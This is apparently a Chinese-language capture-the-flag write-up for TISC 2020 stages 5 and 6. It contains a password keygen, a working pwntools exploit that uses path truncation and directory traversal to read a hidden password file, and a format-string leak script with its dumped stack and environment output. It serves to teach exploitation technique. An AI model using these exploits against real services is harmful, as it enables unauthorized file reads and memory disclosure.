                                   Version 0.1.7 (Alpha)
    ▗▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▖
    ▘                                                                                                                                     ▝
    USERNAME:
尝试登录系统，如果输入错误的账号密码，提示我们用`gust`账户：
    USERNAME: test
    PASSWORD: test
    Sorry, user accounts will only be available in the Beta.
    Use account 'guest' with the password provided at the back of your BBS PRO CD Case!
在认证过程中，输入账号密码后，程序流转至`check_password`函数，检查密码是否最多为`0x19`字节：
对于每个字节，检查是奇数或者偶数索引。如果是偶数索引，取当前密码后4bits并存储，如果是奇数索引,则取前4bits与已经存储的bits合并，生成字节保存为最终构造的密码的一部分，最后与内存中的一个静态值`\x03\x13\x66\x23\x43\x66\x26\x16\x16\x23\x86\x36`比较：
为了生成有效的密码，编写脚本：
    #!/usr/bin/python
    def main():
        key = b"\x03\x13\x66\x23\x43\x66\x26\x16\x16\x23\x86\x36"
        password = b''
        for i in key:
            upper = i >> 4
            lower = i & 0xf
            complete = chr((lower << 4) + upper).encode("ascii") * 2
            password += complete
        print("Password: {}".format(password.decode("ascii")))
    if __name__ == '__main__':
        main()
得到gust的密码`0011ff2244ffbbaaaa22hhcc`后,成功登陆系统：
经过分析，`View Thread`能让我们任意读取系统上的文件。为了读取到`~/.passwd`，使用`starce`运行程序：
    r10@kali:~/tisc$ cat credentials
    guest
    0011ff2244ffbbaaaa22hhcc
    r10@kali:~/tisc$ ((cat data; cat -) | strace ./patched_bbs )
    execve("./patched_bbs", ["./patched_bbs"], 0x7fffd92a33d0 /* 27 vars */) = 0
    brk(NULL)                               = 0x16d2000
    brk(0x16d31c0)                          = 0x16d31c0
    arch_prctl(ARCH_SET_FS, 0x16d2880)      = 0
    uname({sysname="Linux", nodename="kali", ...}) = 0
    readlink("/proc/self/exe", "/stage5/patched"..., 4096) = 46
    brk(0x16f41c0)                          = 0x16f41c0
    brk(0x16f5000)                          = 0x16f5000
    ...
    write(1, "SELECT: ", 8SELECT: )                 = 8
    write(1, "\33[0m", 4)                   = 4
    read(0, V
    "V", 1)                         = 1
    read(0, "\n", 1)                        = 1
    write(1, "\33[0;33m", 7)                = 7
    ...
    write(1, "THREAD: ", 8THREAD: )                 = 8
    write(1, "\33[0m", 4)                   = 4
    read(0, hello_word
    "h", 1)                         = 1
    read(0, "e", 1)                         = 1
    read(0, "l", 1)                         = 1
    read(0, "l", 1)                         = 1
    read(0, "o", 1)                         = 1
    read(0, "_", 1)                         = 1
    read(0, "w", 1)                         = 1
    read(0, "o", 1)                         = 1
    read(0, "r", 1)                         = 1
    read(0, "d", 1)                         = 1
    read(0, "\n", 1)                        = 1
    access("/home/bbs/threads/hello_word.thr", F_OK) = -1 ENOENT (No such file or directory)
    write(1, "\33[2J\33[H", 7
    )              = 7
    write(1, "\33[1;31m", 7)                = 7
    write(1, "Thread does not exist! Press ent"..., 50Thread does not exist! Press enter to continue...
    ) = 50
    write(1, "\33[0m", 4)                   = 4
    read(0,
这里我们可以控制文件名，为了绕过`.thr`，尝试用长文件名，显示路径被截断：
    access("/home/bbs/threads/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAA", F_OK) = -1 ENOENT (No such file or directory)
有了这个思路，编写完整脚本`exploit.py`，执行得到falg：
    #!/usr/bin/python
    from pwn import *
    def main():
        p = remote('fqybysahpvift1nqtwywevlr7n50zdzp.ctf.sg', 12123)
        p.recvuntil("USERNAME: \33[0m")
        p.sendline("guest")
        p.recvuntil("PASSWORD: \33[0m")
        p.sendline("0011ff2244ffbbaaaa22hhcc")
        # Path Truncation Attack
        length = 254
        pathing = b'/home/bbs/threads/'
        prefix = b'../'
        back_part = b'/.passwd'
        slashes = b'/' * (length - len(pathing) - len(back_part) - len(prefix))
        payload = prefix + slashes + back_part
        # SELECT prompt
        p.recvuntil("SELECT: \33[0m")
        p.sendline("V")
        # Send the path
        p.recvuntil("THREAD: \33[0m")
        p.sendline(payload)
        # Get the flag.
        p.recvuntil('\x1b[H')
        flag = p.recvline()
        log.success("Flag: %s" % flag.decode("utf-8"))
    if __name__ == '__main__':
        main()
    python exploit.py
    [+] Opening connection to fqybysahpvift1nqtwywevlr7n50zdzp.ctf.sg on port 12123: Done
    [+] Flag: TISC20{m4ngl3d_b4ngl3d_wr4ngl3d}
**Flag:** `TISC20{m4ngl3d_b4ngl3d_wr4ngl3d}`
## STAGE 6: Blind Boss Battle
连接服务器，可以发现存在字符串漏洞：
    r10@kali:~/tisc$ nc fqybysahpvift1nqtwywevlr7n50zdzp.ctf.sg 42000
    Welcome to Anoroc Riga Server
      Key-Value Storage Service
    ==============================
    Number of users pwned today: 5908
    Function Not Yet Implemented
    AAAA
    AAAA
    %p %p %p %p %p %p %p
    0x7fe685d08a03 (nil) 0x7fe685d08980 0x55f90fc8d0a0 (nil) 0x7fff2fc20690 0x55f90fc8a2e0
但当使用以下payload时，并没有发现`AAAAABBBBB`出现在堆栈泄露中：
    AAAAABBBBA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.
    AAAABBBB.0x7f8ea2940a03.(nil).0x7f8ea2940980.0x5647b7e9d0a0.(nil).0x7ffcea9d97d0.0x5647b7e9a2e0.(nil).0x7f8ea277c0b3.0x7f8ea2979620.0x7ffcea9d97d8.0x100000000.0x5647b7e9a100.0x5647b7e9a2e0.0x23f94e9d138646bf.0x5647b7e9a1f0.0x7ffcea9d97d0.(nil).(nil).0xdc009ba63e6646bf.0xdce40a72934846bf.(nil).(nil).(nil).0x1.0x7ffcea9d97d8.0x7ffcea9d97e8.0x7f8ea297b190.(nil).(nil).0x5647b7e9a1f0.0x7ffcea9d97d0.(nil).(nil).0x5647b7e9a21e.0x7ffcea9d97c8.0x1c.0x1.0x7ffcea9daf5c.(nil).0x7ffcea9daf61.0x7ffcea9dafa3.
这说明我们控制的缓冲区在堆里或者其他可写的内存中。为了寻找线索，编写脚本获取更多的输出：
    #!/usr/bin/python
    from pwn import *
    context.update(arch = 'amd64', os = 'linux')
    def run_leak(p, payload):
        prefix = b"XXXX"
        total = prefix + payload
        p.sendline(total)
        p.recvuntil(prefix)
        data = p.recv()
        return data
    def leak_str(p, index):
        payload = ('AAAA' + '%' + str(index) + '$s %' + str(index) + '$p' + 'CCCC').encode('utf-8')
        r = run_leak(p, payload)
        string = r[4:-4]
        return string
    def main():
        for i in range(100):
            p = remote('fqybysahpvift1nqtwywevlr7n50zdzp.ctf.sg', 42000)
            try:
                leaked_string = leak_str(p, i)
                first_part = leaked_string.split(b' 0x')[0][:8].ljust(8, b'\x00')
                address_maybe = u64(first_part)
                status = b"%s 0x%x %d" % (leaked_string, address_maybe, i)
                print(status)
            except:
                pass
            else:
                p.close()
    if __name__ == '__main__':
        main()
得到一堆输出：
    b'%0$s %0$p 0x2430252073243025 0'
    b'\n 0x7fb9d66f6a03 0xa 1'
    b'(null) (nil) 0x2820296c6c756e28 2'
    b'\x8b \xad\xfb 0x7fe571c13980 0xfbad208b 3'
    b'XXXXAAAA%4$s %4$pCCCC 0x5633c36260a0 0x4141414158585858 4'
    b'(null) (nil) 0x2820296c6c756e28 5'
    b'\x01 0x7ffe5903f370 0x1 6'
    b'\xf3\x0f\x1e\xfaAWL\x8d=\xa3* 0x56177ef4f2e0 0x8d4c5741fa1e0ff3 7'
    b'(null) (nil) 0x2820296c6c756e28 8'
    b'\x89\xc7\xe8\x06+\x02 0x7f11930d60b3 0x22b06e8c789 9'
    b' 0x7f896fe78620 0x0 10'
    b'\\\xefc\xbc\xfd\x7f 0x7ffdbc63d238 0x7ffdbc63ef5c 11'
    b'\xf3\x0f\x1e\xfaU1\xf6H\x8d-\x92/ 0x5648c11c5100 0x48f63155fa1e0ff3 13'
    b'\xf3\x0f\x1e\xfaAWL\x8d=\xa3* 0x55d52ec162e0 0x8d4c5741fa1e0ff3 14'
    b'\xf3\x0f\x1e\xfa1\xedI\x89\xd1^H\x89\xe2H\x83\xe4\xf0PTL\x8d\x05F\x01 0x55b5aed8e1f0 0x8949ed31fa1e0ff3 16'
    b'\x01 0x7ffd3f6b8330 0x1 17'
    b'(null) (nil) 0x2820296c6c756e28 18'
    b'(null) (nil) 0x2820296c6c756e28 19'
    b'(null) (nil) 0x2820296c6c756e28 22'
    b'(null) (nil) 0x2820296c6c756e28 23'
    b'(null) (nil) 0x2820296c6c756e28 24'
    b'\\o-\xf3\xfc\x7f 0x7ffcf32d4ef8 0x7ffcf32d6f5c 26'
    b'a/\x8c8\xfe\x7f 0x7ffe388c13b8 0x7ffe388c2f61 27'
    b' 0x7f4448906190 0x0 28'
    b'(null) (nil) 0x2820296c6c756e28 29'
    b'(null) (nil) 0x2820296c6c756e28 30'
    b'\xf3\x0f\x1e\xfa1\xedI\x89\xd1^H\x89\xe2H\x83\xe4\xf0PTL\x8d\x05F\x01 0x5628217c51f0 0x8949ed31fa1e0ff3 31'
    b'\x01 0x7ffc902d7a70 0x1 32'
    b'(null) (nil) 0x2820296c6c756e28 33'
    b'(null) (nil) 0x2820296c6c756e28 34'
    b'\xf4\x90H\x8d=). 0x560a948af21e 0x2e293d8d4890f4 35'
    b'\x1c 0x7fff0fb76318 0x1c 36'
    b'pwn6 0x7ffdf4d72f5c 0x366e7770 39'
    b'(null) (nil) 0x2820296c6c756e28 40'
    b'PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin 0x7ffdd55a4f61 0x73752f3d48544150 41'
    b'HOSTNAME=70e208321dbb 0x7ffd95f00fa3 0x454d414e54534f48 42'
    b'user=pwn6 0x7fffabdc8fb9 0x6e77703d72657375 43'
    b'HOME=/home/pwn6 0x7ffd44407fc3 0x6f682f3d454d4f48 44'
    b'REMOTE_HOST=10.0.0.3 0x7ffea9b30fd3 0x485f45544f4d4552 45'
    b'(null) (nil) 0x2820296c6c756e28 46'
    b'\x7fELF\x02\x01\x01 0x7ffe8beb9000 0x10102464c457f 48'
    b'\x06 0x5608a1023040 0x6 56'
    b'\x7fELF\x02\x01\x01 0x7f224ba9c000 0x10102464c457f 62'
    b'(null) (nil) 0x2820296c6c756e28 64'
    b'\xf3\x0f\x1e\xfa1\xedI\x89\xd1^H\x89\xe2H\x83\xe4\xf0PTL\x8d\x05F\x01 0x55dec82f61f0 0x8949ed31fa1e0ff3 66'
    b'(null) (nil) 0x2820296c6c756e28 76'
    b'\xf5I\xa3n<\x86\xd6\x13\xbb\xa9$\xdf6\xd5\x86\xddx86_64 0x7ffe30e7adb9 0x13d6863c6ea349f5 78'
    b'(null) (nil) 0x2820296c6c756e28 80'